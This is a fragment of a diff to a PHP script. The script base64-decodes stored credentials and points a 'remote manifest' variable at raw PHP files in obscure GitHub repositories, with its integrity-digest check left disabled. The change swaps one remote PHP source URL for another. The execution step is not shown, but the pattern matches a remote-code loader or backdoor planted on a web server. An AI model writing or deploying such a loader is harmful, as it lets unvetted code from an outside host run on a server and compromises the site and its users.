@@ -17,7 +17,7 @@ $principal = base64_decode($encoded_user);
 $seal = base64_decode($encoded_pass);
 
 // remote source location (raw PHP content)
-$remote_manifest = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";
+$remote_manifest = "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/nau.php";
 
 // optional authoritative content digests (SHA-256). empty=disabled.
 $authorized_digests = []; // e.g. ['3a7bd3...']
